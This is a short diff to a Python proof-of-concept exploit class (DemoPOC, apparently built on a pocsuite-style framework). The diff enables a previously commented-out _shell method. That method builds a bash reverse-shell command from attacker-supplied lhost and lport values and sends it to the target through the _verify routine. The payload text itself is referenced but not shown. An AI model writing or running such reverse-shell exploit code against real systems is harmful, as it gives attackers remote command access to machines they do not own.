@@ -116,10 +116,11 @@ class DemoPOC(POCBase):
 		return self._verify(payload = cmd)
 	
 	def _shell(self):
-		# lhost = dict(self.payload_options["lhost"])["display_value"]
-		# lport = dict(self.payload_options["lport"])["display_value"]
-		# cmd = REVERSE_PAYLOAD.BASH.format(lhost, lport)
-		pass
+		lhost = dict(self.payload_options["lhost"])["display_value"]
+		lport = dict(self.payload_options["lport"])["display_value"]
+
+		cmd = REVERSE_PAYLOAD.BASH.format(lhost, lport)
+		return self._verify(payload = cmd)
 
 
 def get_url(url):
